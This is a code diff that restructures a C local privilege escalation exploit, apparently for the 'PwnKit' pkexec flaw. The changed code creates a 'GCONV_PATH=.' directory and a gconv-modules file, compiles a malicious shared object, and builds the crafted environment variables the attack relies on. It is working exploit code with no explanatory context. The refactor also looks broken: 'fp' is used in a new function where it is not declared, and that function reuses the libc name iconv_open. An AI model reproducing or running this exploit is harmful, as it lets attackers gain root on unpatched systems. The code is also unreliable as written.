@@ -6,7 +6,7 @@
 #include <sys/types.h>
 #include <fcntl.h>
 
-
+struct stat st;
 
 void compileExploit()
 {
@@ -35,19 +35,8 @@ void compileExploit()
 	system("gcc pwnkit/pwnkit.c -o pwnkit/pwnkit.so -shared -fPIC");
 }
 
-int main(int argc, char *argv[]) {
-	FILE *fp;
-    	struct stat st;
-
-	char * a_argv[]={ NULL };
-    	char * a_envp[]={
-        	"pwnkit", 
-	    "PATH=GCONV_PATH=.", 
-	    "CHARSET=PWNKIT", 
-	    "SHELL=pwnkit", 
-	    NULL
-    	};
-
+void gconvpath()
+{
 	if (stat("GCONV_PATH=.", &st) < 0) {
             if(mkdir("GCONV_PATH=.", 0777) < 0) {
                 perror("mkdir");
@@ -60,7 +49,10 @@ int main(int argc, char *argv[]) {
             }
             close(fd);
     	}
-	
+}
+
+void iconv_open()
+{
 	if (stat("pwnkit", &st) < 0) {
             if(mkdir("pwnkit", 0777) < 0) {
                 perror("mkdir");
@@ -75,6 +67,24 @@ int main(int argc, char *argv[]) {
         fprintf(fp, "module UTF-8// PWNKIT// pwnkit 2\n");
         fclose(fp);
     	}
+}
+
+int main(int argc, char *argv[]) {
+	FILE *fp;
+
+	char * a_argv[]={ NULL };
+
+    	char * a_envp[]={
+        	"pwnkit", 
+	    "PATH=GCONV_PATH=.", 
+	    "CHARSET=PWNKIT", 
+	    "SHELL=pwnkit", 
+	    NULL
+    	};
+
+	gconvpath();
+	
+	iconv_open();
 
 	compileExploit();
 
